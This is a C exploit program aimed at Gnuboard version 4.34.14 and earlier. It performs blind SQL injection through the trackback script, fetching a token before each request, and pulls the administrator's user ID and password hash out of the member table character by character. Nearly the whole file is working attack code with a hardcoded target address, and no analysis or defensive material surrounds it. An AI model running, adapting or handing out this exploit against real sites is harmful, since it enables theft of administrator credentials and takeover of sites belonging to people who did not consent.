#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>

const char *crlf = "\x0D\x0A\x0D\x0A";
struct hostent *he = NULL;

#define OLD_PASSWORD	1

#define HTTP_OK		200
#define TARGET		"10.10.10.245"
#define TB_TOKEN_PATH	"/bbs/tb_token.php"
#define TB_PATH		"/bbs/tb.php"
#define BO_TABLE	"free"
#define VALID_ID	"1"

char admin_id[256];
int gs = 0;

int strip_header(int s)
{
	unsigned char acc = 0;
	int n = 0, len = 0, i = 0;
	char *ptr = NULL;
	char buf[1024];

	while(1) {
		memset(buf, 0x00, sizeof(buf));

		if((n = recv(s, buf, sizeof(buf) - 1, MSG_PEEK)) == 0)
			return -1;
		if((ptr = strstr(buf, crlf)) != NULL) {
			len = (ptr - buf) + 4;
			recv(s, buf, len, 0);
			goto filled;
		} else {
			for(i = 0; i < n; i++) {
				if(buf[i] == crlf[acc]) {
					acc++;
				} else {
					if(acc > 0) {
						acc = 0;
					}
				}
				if(acc > 3) {
					recv(s, buf, i, 0);

					goto filled;
				}
			}
			recv(s, buf, i, 0);
		}
	}
filled:
	return atoi(buf + 8);
}

char *Conv(const char *src)
{
	static char ret[1024];
	int i = 0;
	sprintf(ret, "0x");
	for(i = 0; i < strlen(src); i++) {
		snprintf(ret + strlen(ret), sizeof(ret) - strlen(ret), "%02X", *(src + i));
	}
	return ret;
}

void* TimeOut(void)
{
	fprintf(stdout, "[!] TimeOut: closing socket\n");
	close(gs);
	gs = 0;
	return;
}

int SetSocket(void)
{
	struct sockaddr_in sin;
	int timeout = 5;

	while(1) {
		gs = 0;
		if((gs = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
			fprintf(stderr, "[!] socket() error\n");
			goto failed;
		}
		memset(&sin, 0x00, sizeof(sin));
		memcpy(&sin.sin_addr, he->h_addr, he->h_length);
		sin.sin_family = PF_INET;
		sin.sin_port = htons(80);
		signal(SIGALRM, (void*)TimeOut);
		alarm(5);
		if(connect(gs, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
			fprintf(stderr, "[!] connect() error\n");
		}
		alarm(0);
		signal(SIGALRM, SIG_DFL);
		if(gs != 0) break;
	}
	setsockopt(gs, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

	return gs;
failed:
	if(gs > 0) close(gs);
	return -1;
}

char *GetToken(void)
{
	int s = 0, n = 0;
	char buf[1024];
	static char token[33];

	if((s = SetSocket()) == -1) goto failed;

	snprintf(buf, sizeof(buf), 
		"GET %s HTTP/1.0\r\n"
		"Host: %s\r\n\r\n", TB_TOKEN_PATH, TARGET);
	if(send(s, buf, strlen(buf), 0) < 0) {
		fprintf(stderr, "[!] send() error\n");
		goto failed;
	}
	if((n = strip_header(s)) != HTTP_OK) {
		fprintf(stderr, "[!] Unknown HTTP header: %d\n", n);
		goto failed;
	}
	if((n = recv(s, buf, sizeof(buf) - 1, 0)) <= 0) { 
		fprintf(stderr, "[!] recv() error\n");
		goto failed;
	}

	buf[n] = '\0';
	snprintf(token, sizeof(token), "%s", buf);

	close(s);
	return token;
failed:
	if(s > 0) close(s);
	return NULL;
}

void DeleteToken(const char *token)
{
	int s = 0;
	char buf[4096];

	if((s = SetSocket()) == -1) return;

	snprintf(buf, sizeof(buf), 
		"POST %s/%s/%s/%s HTTP/1.1\r\n"
		"Host: %s\r\n"
		"Content-Type: Application/x-www-form-urlencoded\r\n"
		"Content-Length: 35\r\n\r\n"
		"title=1&excerpt=1&url=1&blog_name=1", TB_PATH, BO_TABLE, VALID_ID, token, TARGET);

	if(send(s, buf, strlen(buf), 0) < 0) {
		fprintf(stderr, "[!] send() error\n");
		return;
	}
	recv(s, buf, sizeof(buf), 0);
	close(s);
	return;
}

int GetHash(void)
{
	int s = 0, n = 0, found = -1, i = 0;
	char buf[1024];
	unsigned char *upper_case = "0123456789ABCDEF";
	unsigned char *lower_case = "0123456789abcdef";
	const char *pass = NULL;
	unsigned char c = 0;
	char *token = NULL;
	char *conv = NULL;
	char result[128], tmp[128];
	int founded = 0, limit = 0;

	memset(tmp, 0x00, sizeof(tmp));
	memset(result, 0x00, sizeof(result));

	if(OLD_PASSWORD == 1) {
		limit = 16;
		pass = lower_case;
	} else {
		limit = 41;
		pass = upper_case;
	}
	while(founded != limit) {
		if(founded == 0 && OLD_PASSWORD != 1) {
			sprintf(result, "*");
			founded++;
			continue;
		} else {
			for(i = 0; i < strlen(pass); i++) {
				snprintf(tmp, sizeof(tmp), "%s%c", result, *(pass + i));
				conv = Conv(tmp);
				fprintf(stdout, "[Hash Progress] %s => %s\n", admin_id, tmp);
				if((token = GetToken()) == NULL) {
					fprintf(stderr, "[!] Token error\n");
					return -1;
				}
				if((s = SetSocket()) == -1) goto failed;
				
// UNION SELECT mb_password,1,2 FROM g4_member WHERE mb_no=1 AND mb_password LIKE 0x??25
				snprintf(buf, sizeof(buf),
					"POST %s/%s%%20WHERE%%20mb_id=-1%%20"
					"UNION%%20SELECT%%20mb_password,1,2%%20FROM%%20g4_member%%20"
					"WHERE%%20mb_no=1%%20AND%%20mb_password%%20LIKE%%20%s25--/2/%s HTTP/1.0\r\n"
					"Content-Type: Application/x-www-form-urlencoded\r\n"
					"Content-Length: 35\r\n"
					"Host: %s\r\n\r\n"
					"title=1&excerpt=1&url=1&blog_name=1\r\n", TB_PATH, BO_TABLE, conv, token, TARGET);
				//fprintf(stdout, "buf: %s\n", buf);
				if(send(s, buf, strlen(buf), 0) < 0) {
					fprintf(stderr, "[!] send() error\n");
					goto failed;
				}
	
				int ret = 0;
				ret = strip_header(s);
				fprintf(stdout, "\033[A\033[J");
				if(ret == 200) {
					n = recv(s, buf, sizeof(buf) - 1, 0);
					buf[n] = '\0';
					result[founded++] = *(pass + i);
					i = strlen(pass);
				}
				close(s);
				DeleteToken(token);
			} // end of for() statement
			if(i == strlen(pass) && founded == 0) {
				fprintf(stdout, "[!] ERROR: No such character\n");
				goto failed;
			}
		}
	} // end of while()
	fprintf(stdout, "[*] %s's hash: %s\n", admin_id, result);
failed:
	if(s > 0) close(s);
	return found;
}

int GetID(void)
{
	int s = 0, n = 0, found = -1, i = 0, idn = 1;
	char buf[1024];
	unsigned char *alpha_case = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
	const char *pass = NULL;
	unsigned char c = 0;
	char *token = NULL;
	char *conv = NULL;
	char result[128], tmp[128];
	int founded = 0, limit = 0;

	memset(tmp, 0x00, sizeof(tmp));
	memset(result, 0x00, sizeof(result));

	sprintf(tmp, "_");
	conv = Conv(tmp);

	while(1) {
		if((token = GetToken()) == NULL) {
			fprintf(stderr, "[!] Token error\n");
			return -1;
		}

		if((s = SetSocket()) == -1) goto failed;
	
		snprintf(buf, sizeof(buf),
			"POST %s/%s%%20WHERE%%20mb_id=-1%%20UNION%%20SELECT%%20mb_id,mb_id,mb_id%%20FROM%%20g4_member%%20WHERE%%20mb_no=1%%20AND%%20mb_id%%20LIKE%%20%s25--/2/%s HTTP/1.0\r\n"
			"Content-Type: Application/x-www-form-urlencoded\r\n"
			"Content-Length: 35\r\n"
			"Host: %s\r\n\r\n"
			"title=1&excerpt=1&url=1&blog_name=1\r\n", TB_PATH, BO_TABLE, conv, token, TARGET);
		//fprintf(stdout, "buf: %s\n", buf);
		if(send(s, buf, strlen(buf), 0) < 0) {
			fprintf(stderr, "[!] send() error\n");
			goto failed;
		}

		int ret = 0;
		ret = strip_header(s);
		fprintf(stdout, "[*] Get Number of ID: %d\n", idn);
		fprintf(stdout, "\033[A\033[J");
		if(ret != 200) {
			idn--;
			fprintf(stdout, "[*] Number of ID: %d\n", idn);
			close(s);
			DeleteToken(token);
			break;
		}
		close(s);
		DeleteToken(token);
		strcat(tmp, "_");
		conv = Conv(tmp);
		idn++;
	}

	limit = idn;

	while(founded != limit) {
		for(i = 0; i < strlen(alpha_case); i++) {
			snprintf(tmp, sizeof(tmp), "%s%c", result, *(alpha_case + i));
			conv = Conv(tmp);
			fprintf(stdout, "[*] Admin's ID: %s\n", tmp);
			if((token = GetToken()) == NULL) {
				fprintf(stderr, "[!] Token error\n");
				return -1;
			}
			if((s = SetSocket()) == -1) goto failed;

			snprintf(buf, sizeof(buf),
				"POST %s/%s%%20WHERE%%20mb_id=-1%%20UNION%%20SELECT%%20mb_id,1,2%%20FROM%%20g4_member%%20WHERE%%20mb_no=1%%20AND%%20mb_id%%20LIKE%%20%s25--/2/%s HTTP/1.0\r\n"
				"Content-Type: Application/x-www-form-urlencoded\r\n"
				"Content-Length: 35\r\n"
				"Host: %s\r\n\r\n"
				"title=1&excerpt=1&url=1&blog_name=1\r\n", TB_PATH, BO_TABLE, conv, token, TARGET);
			//fprintf(stdout, "buf: %s\n", buf);
			if(send(s, buf, strlen(buf), 0) < 0) {
				fprintf(stderr, "[!] send() error\n");
				goto failed;
			}

			int ret = 0;
			ret = strip_header(s);
			fprintf(stdout, "\033[A\033[J");
			if(ret == 200) {
				n = recv(s, buf, sizeof(buf) - 1, 0);
				buf[n] = '\0';
				result[founded++] = *(alpha_case + i);
				i = strlen(alpha_case);
			}
			close(s);
			DeleteToken(token);
		} // end of for()
	} // end of while()

	fprintf(stdout, "[*] Admin's ID: %s\n", result);
	sprintf(admin_id, result);
failed:
	if(s > 0) close(s);
	return found;
}

int main(void)
{
	fprintf(stdout, 
		"- Gnuboard <= 4.34.14 SQL Injection Exploit -\n"
		"[-] Published Date: 2011.10.24\n"
		"[-] Reference: http://sir.co.kr/bbs/board.php?bo_table=g4_pds&wr_id=6712\n\n");
	fprintf(stdout, 
		"[*] Target: http://%s%s\n"
		"[*] Valid ID: %s\n", 
		TARGET, TB_PATH, VALID_ID);
		
	fprintf(stdout, "[*] Password Type: %s\n", OLD_PASSWORD == 1 ? "OLD_PASSWORD (16)" : "PASSWORD (41)");
	if((he = gethostbyname(TARGET)) == NULL) {
		fprintf(stderr, "[!] gethostbyname() error: %s\n", TARGET);
		return -1;
	}
	GetID();
	GetHash();
	return 0;
}
